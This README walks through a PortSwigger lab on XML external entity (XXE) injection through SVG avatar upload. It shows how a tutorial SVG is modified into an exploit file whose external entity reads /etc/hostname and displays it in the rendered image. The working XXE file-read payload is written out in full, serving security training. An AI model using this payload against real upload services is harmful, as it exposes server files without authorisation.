# XXE Via Image File Upload

This README file shows the steps taken to solve the following lab:

https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

Create or download an SVG, the one I took comes from the [Mozilla SVG Begginer's Tutorial](https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting_Started "Mozilla Tutorial On SVG's").

Mozilla Tutorial SVG Markup:

```xml
<svg version="1.1"
     width="300" height="200"
     xmlns="http://www.w3.org/2000/svg">

  <rect width="100%" height="100%" fill="red" />

  <circle cx="150" cy="100" r="80" fill="green" />

  <text x="150" y="125" font-size="60" text-anchor="middle" fill="white">SVG</text>

</svg>
```

Mozilla Tutorial SVG Rendered:

![Mozilla SVG](./mozilla-svg.svg "Mozilla SVG Rendered")

SVG Markup After Removing Circle:

```xml
<svg version="1.1"
     width="300" height="200"
     xmlns="http://www.w3.org/2000/svg">
  <rect width="100%" height="100%" fill="red" />
  <text x="150" y="125" font-size="60" text-anchor="middle" fill="white">SVG</text>
</svg>
```

![Mozilla SVG Without Circle](./mozilla-svg-no-circle.svg "Mozilla SVG With Circle Removed")


Same SVG **AFTER** Adding XXE External Entity Injection:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/hostname"> ]>
<svg version="1.1"
     width="600" height="200"
     xmlns="http://www.w3.org/2000/svg">
  <rect width="100%" height="100%" fill="red" />
  <text x="300" y="125" font-size="60" text-anchor="middle" fill="white">&xxe;</text>
</svg>
```

After Uploading Exploit SVG File And Downloading Comment Avatar:

![Hostname Avatar](./hostname.png "Hostname Returned As Avatar")
